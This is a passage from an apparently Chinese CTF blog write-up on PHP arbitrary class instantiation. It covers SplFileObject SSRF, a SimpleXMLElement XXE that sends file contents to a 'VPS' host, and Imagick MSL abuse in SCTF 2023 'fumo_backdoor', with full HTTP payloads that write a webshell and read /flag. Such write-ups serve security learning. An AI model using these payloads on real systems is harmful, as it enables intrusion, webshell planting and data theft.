variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般不会出现这样的情况，即便目标服务中有这样的恶意类，但可能由于没有<code>include</code>而无法调用。</p><p>通过<code>php</code>中的自动加载函数可以找到全局自定义的类。因此利用面就从单个文件扩展到整个项目，前提是有注册回调<code>spl_autoload_register</code>或定义来设置的<code>__autoload</code>。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token string">'./../classes/'</span> <span class="token punctuation">.</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内置类"><a href="#内置类" class="headerlink" title="内置类"></a>内置类</h4><p>内置类很多，但如果只能传递一个参数并且不对创建的对象进行方法调用，那么就很难找到合适的内置类了。</p><h5 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h5><p><code>SplFileObject</code>实现了一个允许连接到任何本地或远程 URL 的构造函数。可以通过该类实现SSRF。</p><p><code>PHP &lt; 8</code> 中的 <code>SSRF</code> 可以通过 <code>Phar</code> 协议技术转化为反序列化。</p><p>因此，满足以下条件即可：</p><ol><li>可上传文件，且路径已知。</li><li>存在<code>pop</code>链</li></ol><h5 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h5><p>该类接收<code>3</code>个参数。</p><p>通过设置第三个参数<code>dataIsURL</code>为<code> true</code>可以实现远程<code>xml</code>文件的加载。第二个参数的常量值设置为<code>2</code>即可。第一个参数 <code>data</code> 用于引入的外部实体的<code>url</code>。因此我们可以通过它打个XXE。</p><p><strong>evil.xml</strong></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype">&lt;!DOCTYPE try[&lt;!ENTITY % remote SYSTEM "https://VPS/send.xml"></span>%remote;%all;%send;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>send.xml</strong></p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % all "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'https://VPS/?%payload;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以直接读文件，就不需要第三个参数了。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=\"1.0\"?></span><span class="token doctype">&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM \"file:///etc/passwd\"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="扩展类"><a href="#扩展类" class="headerlink" title="扩展类"></a>扩展类</h4><h5 id="Magick"><a href="#Magick" class="headerlink" title="Magick"></a>Magick</h5><p><code>Imagick</code>拓展类是用于处理图像的，它是通过<code>Magick Scripting Language</code>语法来处理的。</p><p>这个语法可以用来写、转移文件，难点在于它只支持图片格式，如果不是它支持的图片格式的话就报错。</p><p>通过检索可知利用<code>ppm</code>图像文件格式的特点，可在末尾插入序列化数据而不影响图片的正常解析，这个东西就很妙。</p><p>例如<code>SCTF 2023</code>的<code>fumo_backdoor</code>。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token string">":/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"FUNC_LIST"</span><span class="token punctuation">,</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>             <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[flag]/m'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>             <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token constant">FUNC_LIST</span><span class="token punctuation">[</span><span class="token string">"internal"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">argv</span><span class="token punctuation">;</span>            <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">;</span>                        <span class="token keyword">new</span> <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'unserialze'</span><span class="token punctuation">:</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'rm'</span><span class="token punctuation">:</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp 2>/dev/null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里如果<code>web</code>目录可写，我们可以直接写马。</p><p>通过<code>vid</code>模式，我们可以包含未知名称的<code>MSL</code>格式的临时文件，从而触发<code>MSL</code>语法达到写的目的。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$webshell</span> <span class="token operator">=</span> <span class="token string">"&lt;?php system('ls');?>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据包</strong></p><pre class="line-numbers language-http"><code class="language-http">POST /?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1<span class="token header-name keyword">Host:</span> 127.0.0.1:18080<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 710<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"<span class="token header-name keyword">Content-Type:</span> application/octet-stream&lt;?xml version="1.0" encoding="UTF-8"?>&lt;image> &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4=" /> &lt;write filename="/var/www/html/b.php" />&lt;/image>--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>RCE</code></p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795236160.png" alt="1687795236160"></p><p>当然，一般情况下<code>web</code>目录没法写，这题也是，只不过为了测试改了权限。</p><p>此题的正确解法是想办法触发<code>__sleep</code>从而把<code>flag</code>读出来。</p><p>要触发<code>__sleep</code>必须要序列化，因此该题只能搞个<code>session</code>序列化从而触发<code>__sleep</code>了。</p><p>而<code>php</code>的<code>session</code>是在<code>tmp</code>目录下存放的，该目录一般都可写，并且名称是可控的。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span>           <span class="token comment" spellcheck="true">//生成ppm格式的session内容</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$fumo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fumo_backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fumo</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token string">"/tmp/squirt1e"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//readfile读取的文件，此时是空的。</span><span class="token variable">$serialized</span> <span class="token operator">=</span> <span class="token string">"|"</span> <span class="token punctuation">.</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$fumo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据包</strong></p><pre class="line-numbers language-http"><code class="language-http">POST /?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1<span class="token header-name keyword">Host:</span> 127.0.0.1:18080<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 709<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"<span class="token header-name keyword">Content-Type:</span> application/octet-stream&lt;?xml version="1.0" encoding="UTF-8"?>&lt;image> &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBfE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czoxMzoiL3RtcC9zcXVpcnQxZSI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=" /> &lt;write filename="/tmp/sess_squirt1e" />&lt;/image>--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写成功。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795786583.png" alt="1687795786583"></p><p>接下来就要把<code>flag</code>带到<code>/tmp/squirt1e</code>中，因为题目设置了<code>open_basedir</code>，没办法直接读。我们需要找到一个对文件头要求不严格的文件协议并手动指定，因为<code>flag</code>不是图片，通过<code>Imagick</code>移动会导致报错。</p><p>最终发现<code>mvg</code>、<code>uyvy</code>、<code>RGB</code>三种格式可以利用。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687796509728.png" alt="1687796509728"></p><p>前两个亲测可用。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mvg:/flag<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/tmp/squirt1e<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一个参考作者的<code>exp</code>没成功，记录一下吧，万一以后用得到呢。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- step2: copy flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 设置为RGB格式，读取flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 设置⼀个空图⽚ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!-- 将空图⽚和flag数据进⾏拼接 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 添加偏移后，读取flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!-- 将上⼀张图⽚和这次读取的flag进⾏拼接 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 不断重复，如果读取超出范围，便会报错，并留下上⼀次写⼊的⽂件 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+2<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+3<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token 